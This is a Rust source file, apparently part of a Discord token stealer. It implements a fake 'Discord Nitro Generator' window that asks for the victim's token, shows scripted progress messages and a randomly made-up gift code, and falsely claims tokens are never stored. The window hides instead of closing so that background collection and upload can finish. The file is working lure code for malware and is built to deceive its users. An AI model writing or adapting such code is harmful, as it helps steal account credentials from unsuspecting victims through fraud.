//! Fake "Nitro generator" window. Gives the operator something to look at while
//! the worker thread collects and uploads.

use std::sync::atomic::{AtomicBool, AtomicU32, AtomicUsize, Ordering};

use winapi::shared::minwindef::{DWORD, LPARAM, LRESULT, UINT, WPARAM};
use winapi::shared::windef::{HBRUSH, HDC, HFONT, HMENU, HWND, RECT};
use winapi::um::libloaderapi::GetModuleHandleW;
use winapi::um::wingdi::{
    CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, CreateFontW, DEFAULT_CHARSET, DEFAULT_PITCH,
    FF_DONTCARE, FW_NORMAL, FW_SEMIBOLD, GetStockObject, OUT_DEFAULT_PRECIS, SetBkMode,
    TRANSPARENT, WHITE_BRUSH,
};
use winapi::um::winuser::*;

const CLASS_NAME: &str = "NitroGenWindow";
const BUTTON_ID: usize = 1001;
const TIMER_ID: usize = 1;
const TICK_MS: u32 = 900;
const PHASES: u32 = 5;
const WM_WORK_DONE: UINT = WM_APP + 1;

static STATUS: AtomicUsize = AtomicUsize::new(0);
static GIFT: AtomicUsize = AtomicUsize::new(0);
static BUTTON: AtomicUsize = AtomicUsize::new(0);
static PHASE: AtomicU32 = AtomicU32::new(0);
static DONE: AtomicBool = AtomicBool::new(false);

fn wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

fn gift_code() -> String {
    const SET: &[u8] = b"ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz23456789";
    let mut seed = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos() as u64)
        .unwrap_or(1)
        ^ ((std::process::id() as u64) << 32);
    (0..16)
        .map(|_| {
            seed ^= seed << 13;
            seed ^= seed >> 7;
            seed ^= seed << 17;
            SET[((seed >> 33) as usize) % SET.len()] as char
        })
        .collect()
}

fn phase_text(phase: u32) -> &'static str {
    match phase {
        1 => "Validating token...",
        2 => "Connecting to Discord gateway...",
        3 => "Checking available stock...",
        4 => "Bypassing rate limit...",
        _ => "Claiming 1x Nitro Classic...",
    }
}

unsafe fn font(height: i32, weight: i32) -> HFONT {
    let face = wide("Segoe UI");
    CreateFontW(
        height,
        0,
        0,
        0,
        weight,
        0,
        0,
        0,
        DEFAULT_CHARSET,
        OUT_DEFAULT_PRECIS,
        CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY,
        DEFAULT_PITCH | FF_DONTCARE,
        face.as_ptr(),
    )
}

unsafe fn control(
    parent: HWND,
    class: &str,
    text: &str,
    style: DWORD,
    x: i32,
    y: i32,
    width: i32,
    height: i32,
    id: usize,
) -> HWND {
    let class = wide(class);
    let text = wide(text);
    let instance = GetModuleHandleW(std::ptr::null());
    CreateWindowExW(
        0,
        class.as_ptr(),
        text.as_ptr(),
        WS_CHILD | WS_VISIBLE | style,
        x,
        y,
        width,
        height,
        parent,
        id as HMENU,
        instance,
        std::ptr::null_mut(),
    )
}

unsafe fn set_text(handle: usize, text: &str) {
    if handle != 0 {
        let text = wide(text);
        SetWindowTextW(handle as HWND, text.as_ptr());
    }
}

fn loword(value: usize) -> usize {
    value & 0xffff
}

unsafe extern "system" fn wndproc(hwnd: HWND, msg: UINT, wparam: WPARAM, lparam: LPARAM) -> LRESULT {
    match msg {
        WM_CREATE => {
            let title_font = font(-26, FW_SEMIBOLD);
            let body_font = font(-16, FW_NORMAL);

            let heading = control(hwnd, "STATIC", "Discord Nitro Generator", SS_LEFT, 24, 18, 420, 32, 0);
            let subtitle = control(hwnd, "STATIC", "v2.4  ·  1x Nitro Classic per token", SS_LEFT, 24, 50, 420, 20, 0);
            let token_label = control(hwnd, "STATIC", "Token", SS_LEFT, 24, 92, 420, 18, 0);
            let edit = control(
                hwnd,
                "EDIT",
                "",
                WS_BORDER | ES_AUTOHSCROLL,
                24,
                112,
                412,
                26,
                0,
            );
            let button = control(
                hwnd,
                "BUTTON",
                "Generate Nitro",
                WS_TABSTOP | BS_DEFPUSHBUTTON,
                24,
                152,
                412,
                34,
                BUTTON_ID,
            );
            let status = control(hwnd, "STATIC", "", SS_LEFT, 24, 200, 412, 40, 0);
            let gift = control(hwnd, "STATIC", "", SS_LEFT, 24, 240, 412, 20, 0);
            let footer = control(
                hwnd,
                "STATIC",
                "No login required · tokens are never stored",
                SS_LEFT,
                24,
                276,
                412,
                18,
                0,
            );

            for handle in [heading, token_label, status, gift] {
                SendMessageW(handle, WM_SETFONT, body_font as WPARAM, 0);
            }
            SendMessageW(heading, WM_SETFONT, title_font as WPARAM, 0);
            for handle in [subtitle, edit, button, footer] {
                SendMessageW(handle, WM_SETFONT, body_font as WPARAM, 0);
            }

            STATUS.store(status as usize, Ordering::Relaxed);
            GIFT.store(gift as usize, Ordering::Relaxed);
            BUTTON.store(button as usize, Ordering::Relaxed);
            0
        }
        WM_COMMAND => {
            if loword(wparam) == BUTTON_ID {
                let button = BUTTON.load(Ordering::Relaxed);
                if button != 0 {
                    EnableWindow(button as HWND, 0);
                }
                PHASE.store(0, Ordering::Relaxed);
                set_text(STATUS.load(Ordering::Relaxed), phase_text(1));
                set_text(GIFT.load(Ordering::Relaxed), "");
                SetTimer(hwnd, TIMER_ID, TICK_MS, None);
            }
            0
        }
        WM_TIMER => {
            if wparam == TIMER_ID {
                let phase = PHASE.fetch_add(1, Ordering::Relaxed) + 1;
                if phase < PHASES {
                    set_text(STATUS.load(Ordering::Relaxed), phase_text(phase + 1));
                } else {
                    KillTimer(hwnd, TIMER_ID);
                    set_text(
                        STATUS.load(Ordering::Relaxed),
                        "Success! 1x Nitro Classic has been sent to your DM.",
                    );
                    set_text(
                        GIFT.load(Ordering::Relaxed),
                        &format!("discord.gift/{}", gift_code()),
                    );
                    let button = BUTTON.load(Ordering::Relaxed);
                    if button != 0 {
                        EnableWindow(button as HWND, 1);
                    }
                }
            }
            0
        }
        WM_CTLCOLORSTATIC | WM_CTLCOLOREDIT | WM_CTLCOLORBTN => {
            SetBkMode(wparam as HDC, TRANSPARENT as i32);
            GetStockObject(WHITE_BRUSH as i32) as LRESULT
        }
        WM_CLOSE => {
            if DONE.load(Ordering::SeqCst) {
                DestroyWindow(hwnd);
            } else {
                // Collection is still running: hide instead of killing it.
                ShowWindow(hwnd, SW_HIDE);
            }
            0
        }
        WM_WORK_DONE => {
            if IsWindowVisible(hwnd) == 0 {
                DestroyWindow(hwnd);
            }
            0
        }
        WM_DESTROY => {
            PostQuitMessage(0);
            0
        }
        _ => DefWindowProcW(hwnd, msg, wparam, lparam),
    }
}

unsafe fn create_window(title: &str) -> HWND {
    let instance = GetModuleHandleW(std::ptr::null());
    let class = wide(CLASS_NAME);
    let window_title = wide(title);

    let wc = WNDCLASSW {
        style: CS_HREDRAW | CS_VREDRAW,
        lpfnWndProc: Some(wndproc),
        cbClsExtra: 0,
        cbWndExtra: 0,
        hInstance: instance,
        hIcon: std::ptr::null_mut(),
        hCursor: LoadCursorW(std::ptr::null_mut(), IDC_ARROW),
        hbrBackground: (COLOR_WINDOW + 1) as HBRUSH,
        lpszMenuName: std::ptr::null(),
        lpszClassName: class.as_ptr(),
    };
    RegisterClassW(&wc);

    let hwnd = CreateWindowExW(
        0,
        class.as_ptr(),
        window_title.as_ptr(),
        WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX,
        CW_USEDEFAULT,
        CW_USEDEFAULT,
        480,
        350,
        std::ptr::null_mut(),
        std::ptr::null_mut(),
        instance,
        std::ptr::null_mut(),
    );
    if hwnd.is_null() {
        return hwnd;
    }

    let mut rect: RECT = std::mem::zeroed();
    if GetWindowRect(hwnd, &mut rect) != 0 {
        let width = rect.right - rect.left;
        let height = rect.bottom - rect.top;
        let x = (GetSystemMetrics(SM_CXSCREEN) - width) / 2;
        let y = (GetSystemMetrics(SM_CYSCREEN) - height) / 2;
        SetWindowPos(
            hwnd,
            std::ptr::null_mut(),
            x,
            y,
            0,
            0,
            SWP_NOSIZE | SWP_NOZORDER | SWP_NOACTIVATE,
        );
    }

    ShowWindow(hwnd, SW_SHOW);
    UpdateWindow(hwnd);
    hwnd
}

unsafe fn message_loop() {
    let mut msg: MSG = std::mem::zeroed();
    while GetMessageW(&mut msg, std::ptr::null_mut(), 0, 0) > 0 {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
}

/// Shows the window and runs `work` on a background thread. Falls back to
/// running `work` inline when the window cannot be created.
pub fn show(title: &str, work: impl FnOnce() + Send + 'static) {
    let hwnd = unsafe { create_window(title) };
    if hwnd.is_null() {
        work();
        return;
    }
    let handle = hwnd as usize;
    std::thread::spawn(move || {
        work();
        DONE.store(true, Ordering::SeqCst);
        unsafe { PostMessageW(handle as HWND, WM_WORK_DONE, 0, 0) };
    });
    unsafe { message_loop() };
}
